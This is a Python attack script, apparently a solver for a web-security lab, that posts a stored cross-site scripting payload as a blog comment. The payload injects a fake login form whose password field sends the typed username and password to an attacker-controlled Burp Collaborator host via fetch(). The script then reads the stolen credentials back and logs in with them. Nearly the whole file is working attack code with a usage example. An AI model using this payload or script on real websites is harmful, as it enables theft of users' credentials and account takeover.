import requests
import urllib3
from sys import argv
try:
    import termcolor
except:
    import os
    os.system("pip3 install termcolor")
    import termcolor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def red(text):
    return termcolor.colored(text,"red")


def get_website_urls():
    if len(argv) != 5:
        print(f"[+] usage {argv[0]} <url> <burpcollaborator> <csrf> <session>")
        print(f"[+] example {argv[0]} 'http://example.com' 'udbhe7ybkgm440pijy8bkhs2dtjj78.oastify.com' 'BWyN0dGCrWgHVL0Pp4EoZTXGAgKFRbT9' 'S5FqpElto2doUXJvlDSSEeTPYrwQxKgx'")
        exit(-1)

    if argv[1][-1] == '/':
        url = argv[1][:-1]
    else:
        url = argv[1]

    burpC = argv[2]
    csrf = argv[3]
    session = argv[4]
    return url, burpC, csrf, session

def attack(): 
    print("[+] Starting attack")
    url, burpC, csrf, session = get_website_urls()
    posts_path = "/post/comment"  
    xss_payload = \
"\n\t<input type=text name=username id=\"username\" placeholder=\"user name\">\n\
\t<input type=password name=password placeholder=\"password\" onchange=\"if(this.value.length)fetch('https://%s',{\n\
\t    method:'POST',\n\
\t    mode: 'no-cors',\n\
\t    body:username.value+':'+this.value}\n\
\t);\">" % (burpC)

    print(f"[+] sending xss payload : {red(xss_payload)}")
    params = {
        "csrf"   : csrf,
        "postId" : "1",
        "comment": xss_payload,
        "name"   : "attacker",
        "email"  : "attacker@attack.com",
        "website": ""
        }

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": url,
        "Dnt": "1",
        "Referer": f"{url}/post?postId=1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Te": "trailers"
    }

    cookie = {"session": session}

    r = requests.post(url + posts_path, data=params, cookies=cookie, headers=headers)
    while True:
        credential = input("Please Enter username and password that sent to your burp collaborator with this format username:password : ")
        if ":" not in credential:
            print(red("please enter username and password with this format username:password"))
        else:
            break
    credential = credential.split(":")
    username = credential[0]
    password = credential[1]
    params={
        "csrf": csrf,
        "username": username,
        "password": password
    }

    r = requests.post(url + "/login", data=params, cookies=cookie)

    if 'Congratulations' in r.text:
        print("[+] attack successfully")
    else:
        r = requests.get(url, cookies=cookie)
        if 'Congratulations' in r.text:
            print("[+] attack successfully")
        else:
            print("[-] Attack un successfully")

attack()
